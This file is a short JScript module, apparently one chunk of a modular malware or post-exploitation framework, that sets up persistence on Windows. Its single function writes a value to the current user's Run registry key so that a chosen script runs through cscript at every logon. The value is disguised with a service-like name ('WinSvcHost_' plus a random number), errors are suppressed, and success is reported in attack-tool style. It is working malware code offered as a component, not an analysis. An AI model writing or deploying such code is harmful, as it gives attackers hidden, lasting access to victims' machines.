// chunk: persist/registry_run
// depends: core/run_cmd
// provides: persist_registry
// format: jscript

function persist_registry(scriptPath) {
    var valName = "WinSvcHost_" + Math.floor(Math.random() * 99999);
    var payload = "cscript //nologo //E:jscript \"" + scriptPath + "\"";
    var cmd = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + valName + " /d \"" + payload + "\" /f 2>NUL";
    var r = _run(cmd);
    if (r.indexOf("successfully") >= 0) {
        emit("  [+] Registry Run persistence: " + valName + "\r\n");
    } else {
        emit("  [-] Registry Run persistence failed\r\n");
    }
    return valName;
}
